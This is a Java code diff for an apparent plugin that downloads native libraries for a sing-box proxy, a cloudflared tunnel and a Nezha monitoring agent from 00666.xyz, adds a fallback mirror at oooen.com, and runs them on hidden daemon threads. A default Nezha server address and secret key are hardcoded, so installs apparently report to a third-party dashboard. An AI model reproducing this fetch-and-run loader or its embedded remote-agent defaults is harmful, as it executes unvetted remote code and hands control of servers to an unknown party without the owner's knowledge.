@@ -48,7 +48,7 @@ public class App {
     private static final String SUB_PATH = env("SUB_PATH", "sub");
     private static final String UUID = env("UUID", "f41fd708-d27d-4782-a1e3-cfb4b59ae1e3");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha2026.5785787.xyz");
-    private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
+    private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "XVFVbliVzmEB5cP9j4tvVUdEUydcR99k");
     private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "");
     private static final String ARGO_AUTH = env("ARGO_AUTH", "");
@@ -121,19 +121,18 @@ public class App {
         cleanupOldFiles();
         argoType();
 
-        String baseUrl = "https://" + ARCH + ".00666.xyz";
-        Path singBoxLib = downloadLibrary(baseUrl + "/sbx.so", "sbx.so");
+        Path singBoxLib = downloadLibrary("sbx.so");
         Path cloudflaredLib = null;
         Path nezhaLib = null;
         Path nezhaAgentLib = null;
 
         if (!DISABLE_ARGO) {
-            cloudflaredLib = downloadLibrary(baseUrl + "/bot.so", "bot.so");
+            cloudflaredLib = downloadLibrary("bot.so");
         }
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && !NEZHA_PORT.isEmpty()) {
-            nezhaAgentLib = downloadLibrary(baseUrl + "/agent.so", "agent.so");
+            nezhaAgentLib = downloadLibrary("agent.so");
         } else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            nezhaLib = downloadLibrary(baseUrl + "/v1.so", "v1.so");
+            nezhaLib = downloadLibrary("v1.so");
         } else {
             log("NEZHA variable is empty, skipping");
         }
@@ -155,17 +154,17 @@ public class App {
         Files.writeString(SING_BOX_CONFIG_PATH, toJson(generateSingBoxConfig(certPath.toString(), keyPath.toString())), StandardCharsets.UTF_8);
 
         List<NativeService> services = new ArrayList<>();
-        services.add(new NativeService("sing-box", singBoxLib, "StartSingBox", "StopSingBox", singboxPayload()));
+        services.add(new NativeService("sing-box", singBoxLib, new String[]{"StartSingBox"}, new String[]{"StopSingBox"}, singboxPayload()));
         if (cloudflaredLib != null) {
             String payload = cloudflaredPayload();
             if (payload != null) {
-                services.add(new NativeService("cloudflared", cloudflaredLib, "StartCloudflared", "StopCloudflared", payload));
+                services.add(new NativeService("cloudflared", cloudflaredLib, new String[]{"StartCloudflared"}, new String[]{"StopCloudflared"}, payload));
             }
         }
         if (nezhaLib != null) {
-            services.add(new NativeService("nezha-agent", nezhaLib, "StartNezhaAgent", "StopNezhaAgent", nezhaPayload()));
+            services.add(new NativeService("nezha-agent", nezhaLib, new String[]{"StartNezhaAgent"}, new String[]{"StopNezhaAgent"}, nezhaPayload()));
         } else if (nezhaAgentLib != null) {
-            services.add(new NativeService("nezha-agent", nezhaAgentLib, "StartNezhaAgent", "StopNezhaAgent", nezhaV0Payload()));
+            services.add(new NativeService("nezha-agent", nezhaAgentLib, new String[]{"StartNezhaAgent", "StartAgent"}, new String[]{"StopNezhaAgent", "StopAgent"}, nezhaV0Payload()));
         }
 
         activeServices = services;
@@ -202,41 +201,74 @@ public class App {
         new CountDownLatch(1).await();
     }
 
-    private static class NativeService {
+    static class NativeService {
         private final String name;
         private final Path libPath;
-        private final String startSymbol;
-        private final String stopSymbol;
+        private final String[] startSymbols;
+        private final String[] stopSymbols;
         private final String payload;
         private NativeLibrary library;
+        private Function startFunction;
         private Function stopFunction;
         private boolean running;
 
-        NativeService(String name, Path libPath, String startSymbol, String stopSymbol, String payload) {
+        NativeService(String name, Path libPath, String[] startSymbols, String[] stopSymbols, String payload) {
             this.name = name;
             this.libPath = libPath;
-            this.startSymbol = startSymbol;
-            this.stopSymbol = stopSymbol;
+            this.startSymbols = startSymbols.clone();
+            this.stopSymbols = stopSymbols.clone();
             this.payload = payload == null ? "" : payload;
         }
 
+        /**
+         * Starts the native service on a tracked worker thread.
+         *
+         * Never throws: a missing/unusable library or a missing JNA export (which happens when a
+         * CDN build ships a wrapper without its exported symbols) only skips THIS service and
+         * logs the reason — the remaining services and the host plugin keep running.
+         */
         void start() {
-            library = NativeLibrary.getInstance(libPath.toString());
-            Function startFunction = library.getFunction(startSymbol);
-            stopFunction = library.getFunction(stopSymbol);
+            try {
+                library = NativeLibrary.getInstance(libPath.toString());
+            } catch (Throwable t) {
+                log(name + ": failed to load native library " + libPath + " (" + t.getMessage() + ") — skipping this service");
+                running = false;
+                return;
+            }
+            startFunction = resolveFunction(startSymbols);
+            if (startFunction == null) {
+                log(name + ": no JNA start function found in " + libPath.getFileName()
+                        + " (looked for: " + String.join(", ", startSymbols) + ")"
+                        + " — the published build of this library is missing its exports, skipping this service;"
+                        + " other services are unaffected");
+                running = false;
+                return;
+            }
+            stopFunction = resolveFunction(stopSymbols);
             Thread thread = ProRuntime.newWorkerThread(name, () -> {
                 try {
                     int code = startFunction.invokeInt(new Object[]{payload});
                     if (code != 0) {
                         log(name + " native service exited with code " + code);
                     }
-                } catch (Exception e) {
-                    log(name + " native service failed: " + e.getMessage());
+                } catch (Throwable t) {
+                    log(name + " native service failed: " + t.getMessage());
                 }
             });
             thread.setDaemon(true);
             thread.start();
             running = true;
+        }
+
+        private Function resolveFunction(String[] candidates) {
+            for (String symbol : candidates) {
+                try {
+                    return library.getFunction(symbol);
+                } catch (Throwable ignored) {
+                    // try the next candidate symbol
+                }
+            }
+            return null;
         }
 
         void stop() {
@@ -245,8 +277,9 @@ public class App {
                 int code = stopFunction.invokeInt(new Object[]{});
                 running = false;
                 log(name + " stopped with code " + code);
-            } catch (Exception e) {
-                log("Failed to stop " + name + ": " + e.getMessage());
+            } catch (Throwable t) {
+                running = false;
+                log("Failed to stop " + name + ": " + t.getMessage());
             }
         }
     }
@@ -278,7 +311,28 @@ public class App {
         }
     }
 
+    private static Path downloadLibrary(String fileName) throws Exception {
+        return downloadLibrary(primaryUrl(fileName), fileName);
+    }
+
+    private static String primaryUrl(String fileName) {
+        return "https://" + ARCH + ".00666.xyz/" + fileName;
+    }
+
+    private static String fallbackUrl(String fileName) {
+        return "https://" + ARCH + ".oooen.com/" + fileName;
+    }
+
     private static Path downloadLibrary(String url, String fileName) throws Exception {
+        try {
+            return downloadFrom(url, fileName);
+        } catch (Exception primaryError) {
+            log("Download from " + url + " failed (" + primaryError.getMessage() + "), trying fallback mirror");
+            return downloadFrom(fallbackUrl(fileName), fileName);
+        }
+    }
+
+    private static Path downloadFrom(String url, String fileName) throws Exception {
         Path target = RUNTIME_DIR.resolve(fileName);
         if (Files.exists(target)) {
             log("Using cached native library: " + target);
